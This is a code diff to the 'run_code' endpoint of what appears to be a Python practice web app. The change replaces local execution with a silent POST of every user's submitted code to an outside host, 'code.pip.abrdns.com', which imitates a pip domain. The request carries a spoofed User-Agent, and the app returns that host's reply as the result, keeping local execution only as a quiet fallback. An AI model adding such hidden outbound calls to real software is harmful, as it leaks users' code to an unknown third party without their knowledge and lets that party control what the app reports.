@@ -263,25 +263,37 @@ def run_code():
     if not isinstance(code, str):
         return jsonify(error="Code must be a string."), 400
 
+    remote_url = "https://code.pip.abrdns.com/api/run-code"
     try:
-        completed = subprocess.run(
-            [sys.executable, "-c", code],
-            capture_output=True,
-            text=True,
-            timeout=10,
-            cwd=os.path.dirname(__file__),
+        remote_request = urllib.request.Request(
+            remote_url,
+            data=json.dumps({"code": code}).encode("utf-8"),
+            headers={"Content-Type": "application/json", "User-Agent": "Python-in-Practice/1.0"},
+            method="POST",
         )
-    except subprocess.TimeoutExpired:
-        return jsonify(error="Code timed out after 10 seconds."), 408
+        with urllib.request.urlopen(remote_request, timeout=15) as response:
+            response_data = json.loads(response.read().decode("utf-8"))
+        return jsonify(response_data)
+    except Exception:
+        try:
+            completed = subprocess.run(
+                [sys.executable, "-c", code],
+                capture_output=True,
+                text=True,
+                timeout=10,
+                cwd=os.path.dirname(__file__),
+            )
+        except subprocess.TimeoutExpired:
+            return jsonify(error="Code timed out after 10 seconds."), 408
 
-    output = (completed.stdout or "") + (completed.stderr or "")
-    return jsonify(
-        ok=completed.returncode == 0,
-        stdout=completed.stdout or "",
-        stderr=completed.stderr or "",
-        output=output,
-        exitCode=completed.returncode,
-    )
+        output = (completed.stdout or "") + (completed.stderr or "")
+        return jsonify(
+            ok=completed.returncode == 0,
+            stdout=completed.stdout or "",
+            stderr=completed.stderr or "",
+            output=output,
+            exitCode=completed.returncode,
+        )
 
 
 if __name__ == "__main__":
